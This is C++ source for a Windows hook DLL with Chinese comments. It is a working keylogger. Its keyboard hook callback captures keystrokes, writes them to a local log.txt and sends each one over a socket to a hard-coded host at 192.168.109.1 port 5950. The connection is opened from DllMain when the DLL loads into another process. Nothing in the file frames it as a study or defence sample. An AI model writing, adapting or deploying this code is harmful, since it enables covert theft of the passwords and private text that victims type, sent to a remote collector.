
#include <Windows.h>
#include <DbgHelp.h>
#include <tchar.h>
#include "socket_usr.h"

#pragma comment(lib,"DbgHelp.lib")

void Log(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);

own_socket::Socket_ sendMsg("192.168.109.1", 5950);

//---------------------------------------DLL文件加载-----------------------------------------------------------------------

HANDLE hFile;

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // DLL模块实例
	DWORD fdwReason,     // 调用原因
	LPVOID lpReserved)  // 保留
{
	sendMsg.initial();
	connect(sendMsg.sClient, (struct sockaddr *) &sendMsg.server, sizeof(SOCKADDR_IN));

	switch(fdwReason)
	{
	case DLL_PROCESS_ATTACH: // 进程创建
		hFile = CreateFile(TEXT("log.txt"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		break;
	case DLL_THREAD_ATTACH: // 线程创建
		break;
	case DLL_THREAD_DETACH: // 线程退出
		break;

	case DLL_PROCESS_DETACH: // 进程退出
		CloseHandle(hFile);
		break;
	}
	return TRUE;  // 成功加载Dll模块g
}

//------------------------------以下在其他程序中调用钩子函数---------------------------------------------------------------

LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	//----socket通信----//


	//---end----//

	if (nCode < 0)
	{
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	
	

	// 记录
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* kbhs = (KBDLLHOOKSTRUCT *)lParam;
		CHAR MultiByteStr[2] = "";
		if (kbhs->vkCode>0x30 && kbhs->vkCode <= 0x5A)
		{
			MultiByteStr[0] = (char)kbhs->vkCode;
			WCHAR WideCharStr[2] = TEXT("");
			MultiByteToWideChar(CP_ACP, 0, MultiByteStr, 2, WideCharStr, 2);

			if (strlen(MultiByteStr) != 0)
			{
				Log(WideCharStr, 1);
				send(sendMsg.sClient, MultiByteStr, strlen(MultiByteStr), 0);
			}
		}
	}

	//sendMsg.close();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ---------------------------------------记录信息--------------------------------------------------------------------------

void Log(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
	DWORD lpNumberOfBytesWritten = 0;
	OVERLAPPED overlapped;
	WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
	FlushFileBuffers(hFile);
}
